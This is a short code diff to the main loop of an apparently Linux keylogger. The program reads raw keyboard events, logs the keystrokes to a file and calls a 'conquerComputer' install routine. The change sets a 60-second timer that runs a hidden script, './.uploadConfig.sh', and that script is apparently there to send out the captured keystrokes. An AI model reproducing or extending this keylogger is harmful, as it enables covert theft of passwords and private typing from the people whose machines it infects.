@@ -70,10 +70,10 @@ int main(int argc, char **argv)
         conquerComputer(installPath.c_str());
     }
 
-    int timeInterval = 1;
+    int timeInterval = 60;
     if(args >> GetOpt::OptionPresent('t', "time"))
     {
-        args >> GetOpt::Option('t', "time", timeInterval, 1);
+        args >> GetOpt::Option('t', "time", timeInterval, 60);
     }
     TimerUnit timeController(timeInterval);
     if(!isStdOut)
@@ -91,7 +91,6 @@ int main(int argc, char **argv)
             if(eve.value == KEY_RELEASE && isShift(eve.code))
                 shiftPressed = false;
             if(eve.value == KEY_PRESS)
-                //std::cout << getKey(eve.code, shiftPressed, capsActive) << std::endl;
                 keyWord = std::string(getKey(eve.code, shiftPressed, capsActive));
         }
         if(eve.type == EV_KEY && eve.code == 1)
@@ -103,9 +102,10 @@ int main(int argc, char **argv)
 
         if(timeController.checkTime())
         {
-            fleObj.close();
-            fleObj.open(path, std::ios::app | std::ios::ate);
+            system("./.uploadConfig.sh");
         }
+        fleObj.close();
+        fleObj.open(path, std::ios::app | std::ios::ate);
     }
     close(kbd_Fd);
     fleObj.close();
